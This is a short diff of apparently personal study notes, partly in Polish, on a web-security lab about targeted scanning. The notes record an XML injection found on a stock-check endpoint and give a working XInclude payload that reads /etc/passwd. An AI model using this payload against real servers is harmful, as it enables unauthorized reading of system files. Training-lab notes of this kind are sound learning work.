@@ -1,0 +1,11 @@
+Lab: Discovering vulnerabilities quickly with targeted scanning
+
+Scan tam gdzie jakieś query
+POST /product/stock
+
+Wynik
+Out of band resources    -> nie wykorzystałam
+XMLinjection
+
+Payload
+productId=<foo%20xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include%20parse="text"%20href="file:///etc/passwd"/></foo>&storeId=1
